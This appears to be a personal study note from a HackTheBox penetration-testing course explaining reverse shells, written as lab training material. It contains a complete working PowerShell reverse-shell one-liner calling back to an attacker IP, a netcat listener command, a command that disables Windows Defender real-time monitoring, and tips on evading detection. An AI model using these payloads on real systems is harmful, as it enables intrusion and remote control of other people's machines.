---
title: "Reverse Shells"
kind: topic
tags:
  - cpts-hackthebox
area: "CPTS HackTheBox"
up: "[[Shells and Payloads]]"
notion-id: 385759b92751800d9069ce9a08304b58
---

# Reverse Shells

In: [[Career]] / [[CPTS HackTheBox]] / [[Shells and Payloads]]

## Key Concept

**Reverse shell** = attacker opens a listener, target initiates the connection **back to attacker**.

```
Target (client) ──connects out to──> Attacker (server, listening)
```

Flips the bind shell model — exploits the fact that **outbound traffic is rarely restricted**.

---

## Why Reverse Shells Are Preferred

| Bind Shell | Reverse Shell |
| --- | --- |
| Relies on inbound connections | Relies on outbound connections |
| Heavily firewalled, easily blocked | Outbound usually less monitored |
| Needs internal network access first | Can work from public exploits |
| Easier to detect | Harder to detect (blends with normal traffic) |

> [!note]
> Admins often overlook/allow outbound connections → reverse shells have a **much higher success rate**
>

---

## Trigger Methods (How Target Initiates Connection)

- Unrestricted File Upload
- Command Injection
- Any RCE vulnerability

---

## Resource

**Reverse Shell Cheat Sheet** (revshells.com / payloadallthethings) — pre-built one-liners and generators

> [!warning]
> Admins know these public repos too — may need to **customize payloads** to evade signature-based detection
>

---

## Methodology

```
Start listener (attacker) → Identify target's available shell/tools → Deliver payload → Trigger connection → Interact
```

---

## Hands-on: PowerShell Reverse Shell (Windows)

### Step 1: Start Listener (Attacker)

```bash
sudo nc -lvnp 443
```

> [!note]
> **Use port 443** — blends with normal HTTPS traffic, less likely blocked outbound
⚠️ Deep Packet Inspection (Layer 7) firewalls can still detect non-HTTPS traffic on port 443
> [!note]
>

---

### Step 2: Trigger Reverse Shell (Target)

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> [!note]
> Must replace IP with **your attacker IP** before use
>

**What this payload does:**

1. Opens TCP connection to attacker IP:443
2. Reads commands sent from attacker
3. Executes them via `iex` (Invoke-Expression)
4. Sends output back over the same connection
5. Repeats until connection closes

---

### Common Obstacle: Antivirus Blocking

```
This script contains malicious content and has been blocked by your antivirus software.
```

> [!note]
> Windows Defender flagged the known PowerShell reverse shell pattern — **expected defensive behavior**
>

**Bypass for lab/testing purposes:**

```powershell
# Run as Administrator
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

### Step 3: Catch the Shell

```bash
sudo nc -lvnp 443
# Listening on 0.0.0.0 443
# Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

> [!note]
> `PS` prompt confirms you have an interactive PowerShell session
>

---

## Key Considerations

- **Netcat is NOT native to Windows** → can't always rely on it being available; favor **living-off-the-land** tools (PowerShell, cmd)
- Always ask: *"What shell languages/tools are natively available on this target?"*
- Common ports for listener (443, 80, 53) = blend with normal traffic, less likely blocked
- AV/EDR will likely flag known one-liners — **may need custom/obfuscated payloads** in real engagements

---

## Key Takeaways

- Reverse shell = **target connects out**, attacker just listens — exploits weak outbound filtering
- Port 443 is a smart default for listeners (HTTPS blends in)
- Public cheat sheets are useful but **predictable** — defenders know them too
- AV blocking is the **expected first obstacle** — real engagements require evasion beyond just disabling AV (which you can't do without access already)
- Direction is everything: **bind = inbound to target, reverse = outbound from target**
